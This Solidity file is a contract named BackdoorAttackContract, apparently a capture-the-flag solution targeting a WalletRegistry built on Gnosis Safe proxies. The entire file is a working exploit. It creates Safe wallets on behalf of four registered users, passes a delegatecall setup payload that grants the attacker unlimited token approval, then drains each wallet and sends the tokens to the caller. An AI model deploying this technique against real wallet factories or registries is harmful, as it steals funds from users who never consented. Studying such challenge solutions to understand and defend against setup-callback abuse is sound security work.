// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "./WalletRegistry.sol";

/**
 * @title BackdoorAttackContract
 * @author Edoardo Ierina
 */
contract BackdoorAttackContract {

    function attack(address[] calldata users, address masterCopyAddress, address walletFactoryAddress, address walletRegistryAddress, address tokenAddress) external {
        
        address[] memory owners = new address[](1); 
        IERC20 token = IERC20(tokenAddress);
        GnosisSafeProxyFactory walletFactory = GnosisSafeProxyFactory(walletFactoryAddress);       
        
        for(uint i=0; i<4; i++) {
            owners[0] = users[i];
            // Data payload for optional delegate call.
            bytes memory data = abi.encodeWithSelector(this.approve.selector, address(token), address(this));
            // Payload for message call sent to new proxy contract.
            bytes memory initializer = abi.encodeWithSelector(GnosisSafe.setup.selector, owners, 1, address(this), data, address(0), address(0), 0, address(0));

            GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(masterCopyAddress, initializer, 0, IProxyCreationCallback(walletRegistryAddress));

            token.transferFrom(address(proxy), address(this), token.balanceOf(address(proxy)));
        }

        token.transfer(msg.sender, token.balanceOf(address(this)));
    }
    
    function approve(address token, address receiver) external{
        // executes as delegate call inside GnosisSafeProxy context
        IERC20(token).approve(receiver, 2 ** 256 - 1);
    }
}
